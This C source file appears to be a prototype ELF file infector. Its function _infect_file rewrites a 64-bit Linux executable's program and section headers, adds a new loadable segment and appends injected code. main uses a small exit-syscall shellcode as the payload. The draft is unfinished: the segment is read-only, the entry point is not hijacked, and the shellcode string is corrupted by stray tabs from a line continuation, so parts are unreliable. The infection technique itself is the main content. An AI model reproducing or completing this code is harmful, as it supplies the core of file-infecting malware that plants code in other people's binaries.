#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

#define ALIGN_UP(arg, align) ((arg) % (align) ?		\
	      ((arg) / (align) + 1) * (align) : (arg))

#define ALIGN_DN(arg, align) ((arg) - (arg) % (align))


#define _syscall_wrap(num, ...) syscall(num, __VA_ARGS__)

/*
long _syscall_wrap(long number, ...)
{
	long resultvar;
	asm volatile (
	"movq %%rsi, 	%%rdi	\n\t"
	"movq %%rdx, 	%%rsi	\n\t"
	"movq %%rcx, 	%%rdx	\n\t"
	"movq %%r8, 	%%r10	\n\t"
	"movq %%r9, 	%%r8	\n\t"
	"movq 8(%%rsp),	%%r9	\n\t"
	"syscall		\n\t"
	: "=a" (resultvar)
	: "rax" (number)
	: "memory", "cc", "r11", "cx", "rdi", "rsi", "rdx", "r10", "r8", "r9");
	return resultvar;
}
*/

/* We need to move PHDR to our new segment */

int _infect_file(const char *target_path, void *body, size_t body_s)
{
	/* Open, mmap */
	int target_fd = _syscall_wrap(SYS_open, target_path, O_RDWR);
	if (target_fd == -1)
		return -1;
	struct stat statbuf;
	if (_syscall_wrap(SYS_fstat, target_fd, &statbuf) == -1)
		return -1;
	char *mem = (void*) _syscall_wrap(SYS_mmap, NULL, statbuf.st_size,
					  PROT_READ | PROT_WRITE, MAP_PRIVATE,
					  target_fd, 0);
	if (mem == MAP_FAILED) {
		_syscall_wrap(SYS_exit, 15);
		return -1;
	}

	Elf64_Ehdr *e_hdr = (Elf64_Ehdr*) mem;
	
	/* Check elf exec */
	// Add exec and dyn check
	if (e_hdr->e_ident[EI_MAG0]  	^ ELFMAG0 	|
	    e_hdr->e_ident[EI_MAG1]  	^ ELFMAG1 	|
	    e_hdr->e_ident[EI_MAG2]  	^ ELFMAG2 	|
	    e_hdr->e_ident[EI_MAG3]  	^ ELFMAG3	|
	    e_hdr->e_ident[EI_CLASS] 	^ ELFCLASS64)
		return -1;

	/* Find last LOAD segment, shift every p_offset */
	Elf64_Phdr *last_load = NULL;

	for (Elf64_Phdr *p_hdr = (Elf64_Phdr*) (mem + e_hdr->e_phoff); 
	     p_hdr < (Elf64_Phdr*) (mem + e_hdr->e_phoff) + e_hdr->e_phnum; 
	     p_hdr++) {
		if (p_hdr->p_type == PT_LOAD)
			last_load = p_hdr;
		if (p_hdr->p_type != PT_PHDR)
			p_hdr->p_offset += sizeof(Elf64_Phdr);
		if (p_hdr->p_type == PT_PHDR) {
			p_hdr->p_memsz  += sizeof(Elf64_Phdr);
			p_hdr->p_filesz += sizeof(Elf64_Phdr);
		}
	}

	if (last_load == NULL)
		return -1;

	/* Same changes for sh_offset for every section */
	for (Elf64_Shdr *s_hdr = (Elf64_Shdr*) (mem + e_hdr->e_shoff);
	     s_hdr < (Elf64_Shdr*) (mem + e_hdr->e_shoff) + e_hdr->e_shnum;
	     s_hdr++) {
		if (s_hdr->sh_type != SHT_NULL)
			s_hdr->sh_offset += sizeof(Elf64_Phdr);
	}

	Elf64_Phdr toinject_hdr = {
		.p_align	= last_load->p_align,
		.p_offset 	= e_hdr->e_shoff,
		.p_vaddr	= ALIGN_DN(last_load->p_vaddr, last_load->p_align) 
				  + last_load->p_align + e_hdr->e_shoff % last_load->p_align,
		.p_paddr	= ALIGN_DN(last_load->p_paddr, last_load->p_align) 
				  + last_load->p_align + e_hdr->e_shoff % last_load->p_align,
		.p_filesz	= body_s,
		.p_memsz	= body_s,
		.p_type 	= PT_LOAD,
		.p_flags	= PF_R, };

	size_t inject_phdr_pos = (char*) (last_load + 1) - mem;
	size_t inject_body_pos = e_hdr->e_shoff;
	e_hdr->e_shoff += sizeof(toinject_hdr) + body_s;
	e_hdr->e_phnum++;

	/* Write changes to binary */
	int out_fd = _syscall_wrap(SYS_creat, "out.out", statbuf.st_mode);
	_syscall_wrap(SYS_write, out_fd, mem, inject_phdr_pos);
	_syscall_wrap(SYS_write, out_fd, &toinject_hdr, sizeof(toinject_hdr));
	_syscall_wrap(SYS_write, out_fd, mem + inject_phdr_pos, inject_body_pos - inject_phdr_pos);
	_syscall_wrap(SYS_write, out_fd, body, body_s);
	_syscall_wrap(SYS_write, out_fd, mem + inject_body_pos, statbuf.st_size - inject_body_pos);
	_syscall_wrap(SYS_close, out_fd);

	_syscall_wrap(SYS_munmap, mem, statbuf.st_size);
	_syscall_wrap(SYS_close, target_fd);

	return 0;
}


int main(int argc, char *argv[])
{
	if (argc != 2)
		return EXIT_FAILURE;

	char str_exit[] = "\x48\xC7\xC0\x3C\x00\x00\x00\x48	\
			   \xC7\xC7\x3C\x00\x00\x00\x0F\x05";
	return _infect_file(argv[1], str_exit, sizeof(str_exit));
}
